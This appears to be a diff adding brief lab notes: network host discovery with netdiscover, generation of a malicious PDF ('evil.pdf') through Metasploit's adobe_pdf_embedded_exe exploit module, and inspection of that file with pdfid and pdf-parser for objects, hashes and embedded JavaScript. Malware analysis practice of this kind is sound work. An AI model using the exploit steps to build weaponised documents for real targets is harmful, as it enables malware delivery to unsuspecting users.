@@ -1,0 +1,18 @@
+sudo apt-get install netdiscover
+netdiscover -r 192.168.0.125 (Bridge adapter)
+
+sudo apt-get install pdf-parser
+msfconsole(new tab)
+msfconsole>> use exploit/windows/fileformat/adobe_pdf_embedded_exe
+msfconsole>> show options
+msfconsole>> exploit
+(new tab)
+pdfid /root/.msf4/local/evil.pdf
+pdf-parser /root/.msf4/local/evil.pdf
+pdf-parser -o 10 /root/.msf4/local/evil.pdf (10th object)
+pdf-parser -a /root/.msf4/local/evil.pdf (pdf stats)
+pdf-parser -H /root/.msf4/local/evil.pdf (get hashes if any)
+pdf-parser --search javascript --raw /root/.msf4/local/evil.pdf (javascript)
+
+
+
